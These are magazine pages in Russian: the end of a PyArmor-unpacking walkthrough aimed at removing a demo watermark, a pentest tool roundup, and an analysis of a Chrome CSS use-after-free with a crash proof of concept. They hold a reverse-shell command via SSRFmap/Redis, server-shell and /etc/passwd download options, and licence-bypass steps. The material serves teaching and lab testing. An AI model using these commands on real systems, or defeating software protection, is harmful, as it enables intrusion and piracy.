ленной), в котором приводится схема шифрования байт‑кода:


 wrap header:


        LOAD_GLOBALS    N (__armor_enter__)     N = length of
co_consts
        CALL_FUNCTION   0
        POP_TOP
        SETUP_FINALLY   X (jump to wrap footer) X = size of original
byte code


changed original byte code:


        Increase oparg of each absolute jump instruction by the size
of wrap header


        Obfuscate original byte code


        ...


wrap footer:


        LOAD_GLOBALS    N + 1 (__armor_exit__)
        CALL_FUNCTION   0
        POP_TOP
        END_FINALLY

Если отбросить бессмысленные NOP’ы в начале и SETUP_FINALLY (который,
кстати, в некоторых методах присутствует), то дизассемблированный нами
вручную кусок кода чертовски похож на wrap header. Как следует из при‐
веденной статьи, фрагмент кода от wrap header до wrap footer зашиф‐
рован и расшифровывается прямо внутри текущего блока кода при исполне‐
нии функции __armor_enter__, которая, скорее всего, и вызывается через
CALL_FUNCTION 01h. Проверить это достаточно просто: пошагово пройдя
всю цепочку из девяти команд, после отработки CALL_FUNCTION мы обна‐
руживаем на том же месте волшебным образом преобразованный байт‑код.





Найдя при помощи отладчика адрес функции __armor_enter__ и проана‐
лизировав ее код при помощи IDA, мы обнаруживаем, что и здесь использует‐
ся криптор AES: фантазии у авторов хватило только на повторное применение
того же самого криптоалгоритма.
   Поскольку самую сложную часть нашего  квеста мы уже  выполнили,
а повествование слишком затянулось, о дальнейших действиях буду расска‐
зывать кратко и схематично. Итак, мы пришли к тому, что в коде обнаружились
места, где исполняемый в текущий момент код расшифрован и его можно
модифицировать. Самый  быстрый и ленивый  способ финальной  части
решения нашей задачи в данном случае выглядит так.
  Для начала найдем код метода add_watermark , поставив аппаратную точ‐
ку останова на строковую константу DEMO . Затем поставим хук на функцию
__armor_enter__, отслеживающий расшифровку именно этого фрагмента
кода и выполняющий его патчинг на лету. Поставить его можно, например,
из внешней программы, приаттачившись в нужный момент к исполняемому
процессу. Я описывал подобное многократно, поэтому не буду повторяться.
   Если модификация исполняемого модуля не критична, то можно пропат‐
чить модуль pyarmor_runtime.pyd (предоставляю тебе самому проверить,
насколько он защищен от подобного надругательства) и перепаковать пакет
PyInstall встроенной утилитой zipapp , как мы делали в статье « Змеиная ана‐
томия. Вскрываем и потрошим PyInstaller ». В конце концов, можно сделать
хитрый автохук: исполняемый модуль хукает pyarmor_runtime.pyd, как толь‐
ко  тот  загружается в память, затем __armor_enter__  патчит байт‑код
в памяти после расшифровки.
   Конечно, все эти решения, по сути, быстрые костыли, которые служат лишь
для того, чтобы обойти долгий и муторный процесс полного восстановления
питоновского кода, описанного в процитированной мною статье на «Гит‐
хабе». Если ты невнимательно ее прочитал (или еще не успел прочесть), то
напоминаю, что расшифрованный фрагмент кода не остается открытым
навечно:   после   отработки   его  обратно   зашифровывает   функция
__armor_exit__ , что не дает сдампить все‑все‑все расшифрованные фраг‐
менты кода одномоментно — нужно перебирать их по очереди. Причем
без исполнения, что автор предыдущих трех способов проделывает весьма
причудливым способом.
   Если ты хочешь идти по его стопам, допилив это решение до работос‐
пособного, воспользовавшись описанной в этой статье информацией, —
возможно, ты и прав, так будет проще для тебя. Лично мне способ с запус‐
ком, инжектом и дампом кажется несколько неуклюжим. Этот метод может
сломаться при малейшем изменении начальных условий. Почему бы, к при‐
меру, не пойти прямым путем, последовательно расшифровывая с исполь‐
зованием AES зашифрованные фрагменты кода в модуле .pyc и заNOPив
в завершение wrap header и wrap footer, таким образом окончательно
отвязав модуль от pyarmor_runtime? Как обычно, решать тебе, я не даю
готовое решение, а лишь указываю на возможные варианты. © X
ВЗЛОМ





Мне действительно пришлось постараться,
чтобы собрать для тебя мощную подборку
крутых тулз. Еще и таких, которые никогда
не публиковались в «Хакере». С ними ты                                                                                         ret0x2A
                                                                                            @ret0x2Aсможешь работать по векторам: SSTI, SSRF,
HTTP smuggling, отравление и обман web
cache и не только. С некоторых сдул пыль,
но они прекрасно работают и сегодня.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для  специалистов по безопасности,
                          проводящих  тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой  вред,  причиненный с  применением
                           изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



0000. TPLMAP

Старичок, но очень быстро ищет SSTI в веб‑приложениях. Автоматически
определяет движок шаблонов (Jinja2, Twig, Smarty, Mako, Pebble и 15 других)
и эксплуатирует инъекцию вплоть до shell на сервере.
   SSTI (server-side template injection) — инъекция в шаблон, возникает, когда
пользовательский ввод не экранируется. Введенные данные в чистом виде
попадают в шаблон и обрабатываются шаблонизатором, как остальной код.
Классический пример: хакер вводит в текстовое поле {{7*7}} , в ответе сер‐
вера приходит 49 . Это  значит, что на сервере работает шаблонизатор
Jinja2 или Twig. Если приложение на PHP, значит, Twig. Бэкенд на Python? Зна‐
чит, Jinja2. Шаблонизатор воспринял данные в скобках {{..}} как часть шаб‐
лона и выполнил код внутри скобок.
   Тулза старенькая, поэтому придется поставить Python 3.9. Сделаю это в
виртуальном окружении с помощью pyenv . Если pyenv у тебя не установлен:


curl https://pyenv.run | bash


echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc


source ~/.bashrc

Установка tplmap:


git clone https://github.com/epinna/tplmap
python3 -m venv myvenv
source myvenv/bin/activate
pyenv install 3.9.18
pyenv local 3.9.18
pip install -r requirements.txt
pip install PyYAML requests certifi chardet idna urllib3

Давай потестим на лабе « Server-side template injection in an unknown language
with a documented exploit »:


python3 tplmap.py -u "https://0a5e0095032bcee0814db22e008200dd.
web-security-academy.net/?message=*" --level= 5





                         Пример работы tplmap

Параметр --level определяет, насколько опасные инъекции использовать.
Начинай с 1 ; максимальный пятый уровень указывай только тогда, когда
не боишься навредить приложению.
   Если нужен шелл, в зависимости от условий используй опции:
 • --os-shell — интерактивный шелл в терминале;
 • --bind-shell — тулза забиндит порт под шелл, тебе останется только
   подключиться к нему;
 • --reverse-shell — попытается поднять реверс‑шелл с подключением
   к указанным в параметре хосту и порту;
 • --tpl-shell — интерактивный шелл с помощью движка шаблонизатора.

Для выполнения команд применяй:
 • --os-cmd — выполнение указанной команды на сервере приложений;
 • --tpl-code — инъекция кода в шаблон.

Вишенка на торте — работа с файлами. Чтобы скачать нужный файл с сер‐
вера, передай в параметре --download путь к файлу, например /etc/passwd.
Для загрузки файла на сервер юзай --upload .
   Как видишь, старичок очень хорош и ориентирован на жесткую эксплуата‐
цию!


0001. SSTIMAP

Разработка Владислава Корчагина, исследователя безопасности из России.
Владислав знает о SSTI больше, чем кто‑либо еще. Все собранные знания он
вложил в инструмент SSTImap. В том числе и в новые виды SSTI: error-based
SSTI и boolean error-based blind SSTI. Подробнее смотри в отчете с OFFZONE
2025 .
   SSTImap — это свежий, навороченный и умный аналог tplmap, у которого
гораздо больше возможностей. Здесь больше пейлоадов, способов обойти
WAF и тонких настроек. Есть и оборотная сторона медали: тулзу нужно уметь
запускать. Запуск «в лоб» приведет к излишнему шуму и долгому тестирова‐
нию. Особенно в режиме краулинга и анализа форм.
   Установка из репозитория GitHub:


git clone https://github.com/vladko312/SSTImap
pip3 install -r requirements.txt

Пример запуска:


# Простой запуск
python3 sstimap.py -u 'https://target.com/page?name=John'


# Режим краулинга сайта с тестированием форм
python3 sstimap.py -u 'https://target.com/' --crawl 5 --forms


# Если запросы с JSON в теле
python3 sstimap.py -u 'https://target.com/api/render' \
  -m POST \
  -d '{"name":"*"}' \
  --data-type json \
  -H 'Content-Type: application/json'


# Работа с авторизацией
python3 sstimap.py -u 'https://target.com/page?name=*' \
  -H 'Authorization: Basic bG9naW46c2VjcmV0' \
  -H 'Cookie: session=abc123'


# Запусти Burp Proxy и отслеживай все запросы тулзы. Увидишь
пейлоады и реакции
python3 sstimap.py -u 'https://target.com/page?name=*' -p http://127.
0.0.1:8080





               Работа SSTImap в режиме краулинга и анализа


0010. SMUGGLER

Эта утилита чекает уязвимости типа HTTP request smuggling. Суть атаки в том,
что фронтенд (Nginx, HAProxy и другие реверс‑прокси) и бэкенд по‑разному
интерпретируют границы HTTP-запроса. Когда один из них ориентируется
на заголовок Content-Length , а другой — на Transfer-Encoding: chunked ,
между ними возникает рассогласование. Часть одного запроса «просачи‐
вается» в тело следующего, отсюда и название: smuggling (контрабанда).


git clone https://github.com/defparam/smuggler && cd smuggler
pip3 install requests

Классические варианты контрабанды — CL.TE и TE.CL: CL — от Content-
Length, а TE — от Transfer-Encoding . Тулза делает упор на TE, стараясь
размыть границу запроса при помощи спецсимволов вроде \x01, \x09, \x7f.
Но и с CL работать тоже умеет. Для подтверждения протести на лабе « HTTP
request smuggling, confirming a CL.TE vulnerability via differential responses »
из PortSwigger Web Security Academy.


# Запустить сканирование — инструмент сам попробует все типы
python3 smuggler.py -u https://YOUR-LAB-ID.web-security-academy.net/





                           Найдена уязвимость

Smuggler сохранит в папку payloads файлы с подтвержденными уязвимос‐
тями и выведет путь к файлу в логе. В этом файле лежит запрос, которым уда‐
лось добиться рассинхронизации. Название файла — это имя хоста, тип рас‐
синхронизации (CL.TE или TE.CL) и тип мутации, которая сработала. Исполь‐
зуй эти файлы для анализа и воспроизведения атаки.
   Параметры запуска:
 • -x — выйти, когда найдена первая уязвимость. Без параметра тулза про‐
   гонит все известные ей варианты;
 • -m — метод GET/POST . По умолчанию использует POST ;
 • -q — тихий режим: выводит только инфу о найденных уязвимостях;
 • -l — файл для ведения лога;
 • -v — использовать виртуальный хост. При выполнении запросов тулза
   подставит в заголовок Host значение из параметра. Так можно атаковать
   скрытые ресурсы. Используй после прогона, например, gobuster vhost
   или ffuf ;
 • -c — имя конфига из папки configs . Конфиги — это скрипты на Python.
  В стандартной поставке есть три конфига с разным атакующим потен‐
   циалом. Ты можешь добавить свой, чтобы расширить виды атак или подог‐
   нать  работу под  конкретное  приложение.  Пример  конфига  смотри
   в репозитории, в блоке Config Files .


0011. H2CSMUGGLER

h2c (HTTP/2 over cleartext) — это еще один вид контрабанды: через апгрейд
соединения с HTTP/1.1 на HTTP/2 без TLS. Прокси по спецификации должны
блокировать этот заголовок, но многие просто пробрасывают его дальше.
Если бэкенд поддерживает h2c, туннель установлен, и все последующие зап‐
росы идут в обход логики прокси, атакующий получает доступ к закрытым
ресурсам.
   Исходный инструмент написан Bishop Fox на Python. Компания Assetnote
портировала проект на Go. Оригинал до сих пор работает, но есть проблемы
с запуском. Используй версию Assetnote, но для исторической справедливос‐
ти тесты выполним на демке Bishop Fox.
   Создаем отдельную папку и загружаем туда проект с демкой. Отдельная
папка нужна, чтобы избежать конфликта имен, — обе тулзы названы одинако‐
во:


git clone https://github.com/BishopFox/h2csmuggler

Проект  старенький.  Чтобы  запустился,  поменяй  configs/Dockerfile-
backend на:


FROM golang:1.21-alpine
RUN apk add --no-cache git
WORKDIR /go/src/app
COPY demo.go .
RUN go mod init app && \
    go get golang.org/x/net@v0.23.0 && \
    go mod tidy
RUN go build -o /usr/local/bin/app .
CMD ["app"]

Генерируем сертификаты, иначе сервер стартанет с ошибками:


chmod +x configs/generate-certificates.sh
./configs/generate-certificates.sh

Выполни docker compose up -d . Убедись, что контейнер слушает порты
8001 , 8002 и 8003 :


ss -tlnp | grep -E '8001|8002|8003'

Ставим вариант тулзы от Assetnote:


git clone https://github.com/assetnote/h2csmuggler.git
cd h2csmuggler
go build ./cmd/h2csmuggler

Проверь, что доступ к /flag заблокирован:


curl -k https://localhost:8001/flag
curl -k https://localhost:8002/flag
curl -k https://localhost:8003/flag

Стандартный запуск проверки на один хост:


./h2csmuggler smuggle https://localhost:8002




                           Уязвимость найдена

Закидываем ссылки в текстовый файл:


cat > urls.txt << EOF
https://localhost:8001/
https://localhost:8002/
https://localhost:8003/
EOF

Сканируем по ссылкам из файла:


./h2csmuggler check -c 3 -i urls.txt





                     h2csmuggler нашел уязвимость





Тулза работает в одном из трех режимов:
 • check — базовая проверка;
 • smuggle — режим подтверждения уязвимости, в нем утилита попробует
   достучаться до конкретного файла;
 • mutate pitchfork — модификация входных путей для работы по своему
   словарю.

Например, у тебя есть словарь интересных имен файлов. Сложи их в paths.
txt и выполни такую команду:


./h2csmuggler mutate pitchfork http://localhost -i paths.txt | \
    ./h2csmuggler smuggle https://localhost:8002 - -o json

Сначала mutate  pitchfork сгенерирует пути вроде http://localhost/
admin , затем каждый путь будет обработан с помощью smuggle . Попробуй
запустить команду отдельно с опциями -C и -P . Первая говорит smuggle , что
нужно сравнивать результаты. Вторая — это читабельный формат вывода.





             Красивый вывод при сканировании путей из файла

При желании можешь использовать и вариант Bishop Fox, но  придется
покопаться в исходниках, написанных на Python. Метод ssl.wrap_socket()
удалили в Python 3.12.
    Установка:


pip3 install h2
git clone https://github.com/BishopFox/h2csmuggler


0100. IPFUSCATOR

Классная утилита, с которой ты получишь IP-адрес в разных представлениях:
hex, oct, decimal, смешанных и еще нескольких вариантах. Это может при‐
годиться для обфускации IP и байпаса WAF. Например, в SSRF-атаках часто
упираешься в то, что не можешь протолкнуть локальный IP через WAF. Забудь
про  гуглинг  способов  обфускации:  достаточно одной  команды,  чтобы
получить десяток вариантов.
   Тулза написана на Python, запускается без дополнительных пакетов, прос‐
то клонируй и пользуйся:


git clone https://github.com/vysecurity/IPFuscator
cd IPFuscator
python3 ipfuscator.py 127.0.0.1





                   Варианты обфускации известного AWS IP


0101. SSRFMAP

Инструмент для настоящих маньяков SSRF, и не просто тулза, а целый фрей‐
мворк. Архитектура модульная, и в базе 24 модуля сканирования. Среди них
portscan — поиск портов, подходящих для эксплуатации, и модуль сканиро‐
вания сети — networkscan .
   Множество модулей предназначены для работы с конкретными  сис‐
темами: aws, mysql , redis , docker.  Обязательно  протестируй модуль
readfiles — это модуль чтения файлов.
   Если нужного тебе модуля нет, можешь написать свой. Шаблон модуля
автор выложил в репозитории .
  Для установки просто клонируй репозиторий и установи зависимости:


git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap/
pip3 install -r requirements.txt
python3 ssrfmap.py




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИВЗЛОМ
       B1001             УТИЛИТ
        ДЛЯ ХАКЕРА
            СОБИРАЕМ ИНСТРУМЕНТЫ
                  ДЛЯ ПЕНТЕСТИНГА





                       Пример работы SSRFmap

Для запуска положи HTTP-запрос в файл. Автор предлагает сохранять запрос
из Burp, но это не принципиально. Главное — правильно задать структуру
и не использовать HTTP/2 (вторую версию HTTP тулза не знает и падает
с ошибкой). Просто поменяй версию на 1.1, а веб‑прокси сам разберется,
как апгрейдить версию для своей работы.
   Пример запуска:


python3 ssrfmap.py -r examples/request.txt -p url -m readfiles

Через -r указываешь путь к файлу с запросом. Опцией -p сообщаешь,
с каким параметром запроса работать. Опция -m — это указание на модуль,
с которым запускать тест. При необходимости укажи несколько модулей
через запятую.
   Поднятие реверс‑шелла через Redis:


python3 ssrfmap.py -r request.txt -p stockApi -m redis --lhost=10.10.
14.1 --lport= 4242 -l 4242


0110. AUTOPOISONER

Инструмент для быстрого поиска уязвимостей web cache poisoning. Если зас‐
тавить кеш сохранить вредоносный ответ, он будет отдаваться всем поль‐
зователям, которые запросят ту же страницу.
   «Поизонер» перебирает заголовки и ищет подходящие для отравления.
Быстрый, легкий и эффективный, написан на Python. Для установки клонируй
репозиторий и используй:


git clone https://github.com/Th0h0/autopoisoner
cd autopoisoner
python3 autopoisoner.py -u https://www.target.com -b


             INFO

                       Скрипт старенький, поэтому будет выпадать пре‐
                           дупреждение.   Чтобы   его   убрать,   открой
                   autopoisoner.py . В строках 99 и 100 добавь
                      перед кавычками регулярных выражений модифи‐
                        катор f . Пример первого выражения: regexp1
                   = f'(?<=src=")(\/[^\/].+?)(?=")' .


Протестировать можно на лабе « Web cache poisoning with an unkeyed header ».
Она уязвима к отравлению кеша через заголовок X-Forwarded-Host . Тулза
молниеносно находит точку для инъекции.





Для массового сканирования указывай не конкретный --url , а файл со спис‐
ком --file. Количество потоков регулируй через --threads. Если первый
проход ничего не нашел, попробуй --behavior — это режим поиска нес‐
тандартного поведения.


0111. WCVS — WEB CACHE VULNERABILITY SCANNER

Это тяжелая артиллерия для работы с уязвимостями веб‑кеша. В отличие
от autoPoisoner поддерживает множество техник, использует собственный
краулер и адаптируется под конкретный вектор атаки. Умеет как отравлять
(poisoning), так и обманывать (deception). В первом случае внедряет вре‐
доносный контент для пользователей. Во втором — ворует конфиденциаль‐
ные данные.
   Выбор режима зависит от поведения кеша. Если он возвращает HIT,
WCVS пробует отравление. Если он всегда возвращает MISS , WCVS тестирует
обман и кражу данных.
   Установка в Kali:


sudo apt install web-cache-vulnerability-scanner

Универсальная установка при помощи Go:


go install -v github.com/Hackmanit/Web-Cache-Vulnerability-
Scanner@latest

Запуск без настроек:


wcvs -u https://target.com





                     Стандартный скан лабы PortSwigger

Из‑за большого количества проверок WCVS работает гораздо медленнее,
чем autoPoisoner, но результат тебя порадует.





                            Тулза нашла векторы атаки

Примеры использования:


# С авторизацией через куки
wcvs -u https://target.com -sc "PHPSESSID=abc123"


# Добавить заголовки к каждому запросу
wcvs -u https://target.com -sh "Authorization: Bearer TOKEN"


# Краулинг на глубину 3 уровня
wcvs -u https://target.com -r 3


# Список URL из файла
wcvs -u file:urls.txt


# POST-запрос с телом
wcvs -u https://target.com -post -sb '{"test":"value"}' -ct
"application/json"


# Кастомный словарь заголовков
wcvs -u https://target.com -hw "file:my-headers.txt"


1000. PPMAP

Утилита в автоматическом режиме ищет prototype pollution. PP — это уяз‐
вимость на стороне клиента, возникающая, когда злоумышленник контро‐
лирует свойства объектов JavaScript через механизм прототипирования.
Для  загрязнения  прототипа  используется __proto__ или constructor.
prototype в URL-параметрах.
   Инструмент  проверяет  наличие  уязвимости  через  location.hash
и location.search, после чего применяет известные гаджеты в глобальном
контексте и выдает готовый XSS-payload.
  Для повышения точности работы тулза использует движок Chromium.
   Установи через скрипт:


git clone https://github.com/kleiton0x00/ppmap.git
cd ppmap
bash setup.sh  # Установит Chromium и соберет бинарь

Чтобы быстро проверить тулзу в деле, используем лабу « Client-side prototype
pollution via browser APIs »:


echo "https://<your-lab-id>.web-security-academy.net/" | ppmap





            Найденные векторы атаки в лабораторной PortSwigger

Я специально сделал скриншот так, чтобы продемонстрировать векторы,
которые нашел ppmap , и гайд по решению лабы PortSwigger. Прекрасно видно
как минимум одно совпадение: /?__proto__[value]=foo и результат скана /
#__proto__%5Bppmap%5D=reserved .  Принципиальная  разница в том, что
в гайде решение через параметры, а ppmap нашел точку инъекции в хеше.
Вероятно, дело в преднамеренном упрощении со стороны PortSwigger, чтобы
не усложнять жизнь ученикам.
  Для массового сканирования используй cat url.txt | ppmap , где каж‐
дый URL находится на отдельной строке файла.


1001. KITERUNNER

Это утилита, сделанная специально для сканирования и брута API. Только
это не фаззер в прямом смысле. Используя ffuf и подобные фаззеры, ты
можешь слать рандомные запросы на REST API в надежде, что API примет
запрос и что‑то вернет назад. Но многие сервисы просто откинут твои GET
и POST без определенной структуры. Разработчики Kiterunner построили свой
сканер по другому принципу. Они собрали больше 67 тысяч Swagger-спе‐
цификаций и составили объемные словари, которые воспроизводят коррек‐
тные запросы к API.
   Сильная сторона Kiterunner — это и его слабая сторона: тулза работает
медленно. Она выполняет несколько запросов для каждого пути: запросы
с разными методами, параметрами и предварительные запросы для детекта
разницы в поведении. Для простых API, в том числе в разных лабах, лучше
пользоваться ffuf и подобными фаззерами. А вот для работы с серьезными
проектами подключай Kiterunner.
    Тулзу удобнее всего собирать из исходников:


git clone https://github.com/assetnote/kiterunner
cd kiterunner
go build -o kr ./cmd/kiterunner
sudo mv kr /usr/local/bin/

Если собираешь в Windows:


go build -o kr.exe ./cmd/kiterunner

После установки оцени количество базовых словарей:


# Посмотреть встроенные словари
kr wordlist list

Каждый словарь — это набор не только эндпоинтов, но и корректных схем,
построенных на основе анализа спецификаций и результатов тестов.





                             Список словарей

Тулза работает в режимах scan и brute . Брут — режим, максимально
похожий на работу классических фаззеров, но формирующий корректные
запросы с точки зрения схем API.
  В режиме скана включаются все механизмы: предварительные запросы
и множественные тесты. Скан ищет варианты корректного подтверждения
открытых и скрытых эндпоинтов.
   Режим  работы  программы  указывай  командой  наподобие  запуска
gobuster :


kr <сommand> ...params... <options>

Примеры запуска:


# Быстрый скан одного хоста
kr scan http://target.com


# Скан по списку целей
kr scan -i urls.txt


# Брут с конкретным словарем
kr brute http://target.com -w /path/to/wordlist.kite


# Увеличить количество потоков
kr scan http://target.com -x 20

При запуске укажи либо URL API, либо домен, либо файл со списком. Прог‐
рамма прекрасно принимает все эти варианты.


ЗАКЛЮЧЕНИЕ

Я постарался подобрать самые мощные и полезные инструменты для пен‐
теста и хакинга. С их помощью ты значительно повысишь эффективность тес‐
тирования. Но не стоит забывать, что каждый инструмент — это только
помощник.  Важно понимать,  как  именно  работает  та или иная  атака.
Без понимания этого ты часто будешь сталкиваться с уязвимостями, которые
не можешь проэксплуатировать.
   Если ты только в начале своего пути в пентесте, используй тулзы не как
основной инструмент для атак. Потрать время, чтобы изучить их исходный
код. Разберись, по какому принципу они работают, как выполняют атаки. Изу‐
чи пейлоады, которые есть в словарях  утилит. Это даст реальный буст
в понимании пентеста. © X
ВЗЛОМ





Ты просто открываешь сайт, а вредоносный
код уже выполняется в браузере. Дальше
он пытается выбраться из песочницы и зах‐
ватить комп. К таким последствиям может                                                                                         ret0x2A
                                                                                            @ret0x2Aпривести уязвимость use after free в движке
CSS Chrome  (CVE-2026-2441).  Пока  ты
читаешь статью, тысячи пользователей про‐
должают сидеть на уязвимой версии бра‐
узера.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для  специалистов по безопасности,
                          проводящих  тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой  вред,  причиненный с  применением
                           изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.


Уязвимость относится к use after free (UAF). Участок памяти освобождается,
но указатель на него сохранен и может быть повторно использован. В край‐
нем случае злоумышленник получит полноценную RCE, подложив в память
фейковый объект нужного размера с собственными функциями. Останется
добиться, чтобы аллокатор снова выделил этот участок памяти. Приложение
пытается вызвать легитимную функцию или метод, но выполняется то, что
хакер подложил.
   Уязвимость CVE-2026-2441 обнаружилась в подсистеме CSS движка Blink.
Движок занимается преобразованием HTML, CSS и JS в полноценные
веб‑страницы: код HTML конвертирует в DOM, а код CSS — в CSSOM. Внутри
CSSOM  создаются  структуры, представляющие  правила.  Уязвимость —
в обработке правила @font-feature-values . Изменяя элементы этого пра‐
вила в JS-коде, злоумышленник может атаковать браузер.
   Правило @font-feature-values помогает веб‑разработчикам сделать
код CSS более читаемым и управляемым. Внутри помещается набор име‐
нованных значений. В статье я буду использовать @styleset, но имя может
быть любым. В наборе человекочитаемым названиям присваиваются чис‐
ловые значения OpenType. Пример использования:


@font-feature-values CoolFont {
  @styleset {
    fancy: 1;
    flowing: 2;
  }
}


/* Теперь можно спокойно использовать в CSS вместо непонятных цифр */
.special-text {
  font-family: CoolFont;
  font-variant-alternates: swash(fancy);
}

Blink при работе создает для блока @styleset внутреннюю хеш‑таблицу
на основе WTF::HashMap . Доступ к этой структуре из JavaScript происходит
через объект CSSFontFeatureValuesMap . Это обертка над внутренним кон‐
тейнером движка.
   Проблема  возникает  при  использовании  итераторов.  При  вызове
в  JavaScript  map.entries()   Blink  создает  в  табе  объект‑итератор
FontFeatureValuesMapIterationSource . В уязвимой версии итератор хра‐
нил сырой указатель на внутренний контейнер FontFeatureAliases .


const FontFeatureAliases* aliases_;

Контейнер FontFeatureAliases — это алиас WTF::HashMap , объявленный
через using . Информацию можно найти в исходниках Chromium :


using FontFeatureAliases = HashMap<AtomicString,
FeatureIndicesWithPriority>;

Если во время итерации происходит мутация, например set() или delete() ,
контейнер может выполнить рехеш — перераспределить память, перенести
элементы в новый буфер и освободить старый. Но указатель внутри итерато‐
ра остается прежним. Он указывает на освобожденный участок памяти.
Это UAF в чистом виде.
   Простой PoC уязвимости демонстрирует краш вкладки. После рехеша
любой вызов .next() приводит к ее падению из‑за отсутствия доступа к учас‐
тку памяти. В простом виде уязвимость может показаться бесполезной, но в
сочетании с другими уязвимостями CVE-2026-2441 приводит к классической
цепочке: UAF → Arbitrary read/write memory → Sandbox escape → Remote code
execution.
   Такие атаки могут быть направлены как на корпоративных клиентов —
через фишинг и социальную инженерию, так и на рядовых пользователей
интернета, чтобы использовать ресурсы их устройств в теневых схемах: сде‐
лать машину частью ботнета, повесить майнер, задействовать вычислитель‐
ные ресурсы для взлома хешей и прочих злодеяний. Для привлечения тра‐
фика на вредоносные страницы хакеры используют все доступные методы:
размещают вредоносный код на крупных взломанных ресурсах, рассылают
фишинговые письма и закупают рекламу в сетях с возможностью таргетинга
на конкретный браузер.
   Наиболее масштабно браузерные UAF эксплуатировали через экспло‐
ит‑киты в период 2014–2016 годов, когда Angler и Neutrino активно исполь‐
зовали  уязвимости в  Internet  Explorer и  Flash.  После их  исчезновения
в 2016 году браузерные эксплоиты редко становятся публичными. Техники
атак тщательно скрываются из‑за потенциально большого ущерба. CVE-
2026-2441, о которой мы говорим, по имеющимся данным , активно эксплуати‐
ровалась отдельными хакерами и группировками как полноценный zero-day.


ГОТОВИМ СТЕНД

Уязвимость  есть  в  Chrome  до  версии  145.0.7632.75.  Я  исполь‐
зую 145.0.7632.68. Скачиваем установщик из репозитория GitHub , отключаем
интернет и устанавливаем браузер офлайн. Перед запуском заходим в служ‐
бы Windows и отключаем запуск всех служб, связанных с Google Update.
   Если службы обновления нет, открываем regedit и переходим в ветку
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google. Создаем раздел Update,
если    его     нет.     Внутри    создаем    три    DWORD-параметра:
AutoUpdateCheckPeriodMinutes, UpdateDefault и Update{8A69D345-D564-
463C-AFF1-A69D9E530F96} . Все три значения устанавливаем в 0 .
   Открываем браузер, в справке — пункт About, убеждаемся, что установ‐
лена правильная версия и Chrome не может обновиться.





Для выгрузки дампов можно использовать ProcDump или аналог. Скачиваем
архив с сайта Microsoft и распаковываем его. Программа портативная и не
требует установки.
  Для анализа я буду использовать WinDbg. Ставим его из официального
магазина или скачиваем с сайта Microsoft .


PROOF OF CONCEPT

Все, что нужно, — это загрузить в браузер HTML-страницу с вредоносным
JavaScript-кодом. Создадим HTML-файл:


<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>CVE-2026-2441 PoC</title>
    </head>
    <body>
        <h2>Пропатченный браузер</h2>
        <script>
            const style = document.createElement("style");
            document.head.appendChild(style);


            style.sheet.insertRule(`
            @font-feature-values POC {
              @styleset { a:1; b:2; c:3; d:4; }
            }`, 0);


            const map = style.sheet.cssRules[0].styleset;
            const it = map.entries();


            for (let i = 0; i < 512; i++) {
              map.set("k" + i, i);
            }


            while (true) {
              const r = it.next();
              if (r.done) break;
            }
        </script>
    </body>
</html>

Открываем файл в уязвимой версии Google Chrome. Можно прямо через
file:// . Вместо страницы должно появиться сообщение «Aw, Snap!». Если
видишь «Пропатченный браузер», проверь версию браузера, вернись к уста‐
новке и отключи обновления.





                    Успешная работа proof of concept

Чтобы получить полноценный дамп памяти в момент краша, запустим Chrome
без песочницы. Если запустить браузер в обычном режиме, процесс будет
изолирован.
   Переходим в папку Chrome (обычно это %localappdata%\Google\Chrome\
Application\) и выполняем


.\chrome.exe --no-sandbox --disable-gpu

Нам нужен PID таба в Chrome, чтобы передать его в ProcDump. Для этого
в уязвимом Chrome переходим на страницу about:blank или любую другую.
Не стоит брать PID таба с домашней страницы. Перед загрузкой веб‑ресурса
или файла Chrome убьет этот таб и создаст новый с другим PID.
  Жмем Shift-Esc — откроется диспетчер задач Chrome. Находим процесс
«Tab: about:blank» и запоминаем PID.





                       Task Manager Google Chrome

Открываем  терминал Windows  от  имени  администратора и  запускаем
ProcDump, указав PID вкладки:


.\procdump.exe -e 1 -ma -n 3 <PID> "C:\ChromeDumps"

С параметром -e тулза начнет мониторить процесс в ожидании исключения.
Единичка нужна, чтобы ProcDump дампил только при необработанных исклю‐
чениях — то есть при краше процесса. Через -ma мы сообщаем, что нужен
полный дамп без сжатия. Параметр -n — это максимальное количество дам‐
пов, которые сделает ProcDump. В реальности дамп будет один, но на всякий
случай укажем значение чуть больше. В конце команды пишем путь к папке,
в которую надо скинуть дамп.
   Возвращаемся в Chrome, указываем адрес к poc.html : file://path/to/
poc.html . Вместо страницы увидим «Aw, Snap!». Из  списка  процессов
исчезнет процесс вкладки. PoC сработал, вкладка крашнулась.





                      Результат выполнения proof of concept

В терминале ProcDump мы увидим сообщение с номером исключения
и путем к файлу дампа.





                          Выгрузка дампа процесса

Открываем WinDbg, в меню File выбираем Open Dump File. После загрузки
файла в командной строке вводим !analyze -v . Команда запускает авто‐
матический анализ текущего состояния. Из отчета мы узнаем, например, код
ошибки — 0xc0000005 . Параметр Failure.ProblemClass.Primary имеет
значение INVALID_POINTER_READ . Это вызов .netx() : код пытается обра‐
титься к области памяти, которая уже была освобождена. Это произошло
из‑за вызова .next() после рехеша.
   Кликаем на окно с отчетом, жмем стандартный вызов поиска — Ctrl-F. Клю‐
чевую информацию находим в блоке EXCEPTION_RECORD . Причину краша
и адрес памяти, к которой обратился итератор, находим в тексте ошибки:
Attempt to read from address 000014340024b000 . Адрес многократно
продублирован, его сложно не заметить.
   Чтобы посмотреть на уровне инструкций ассемблера и регистров процес‐
сора, находим блок CONTEXT или выполняем .ecxr . В этом контексте будет
видно, куда именно пытался обратиться итератор. В моем выводе так:


00007ffc`75aabff7 4c8b01          mov     r8,qword ptr [rcx] ds:
000010b4`0024b000=????????????????

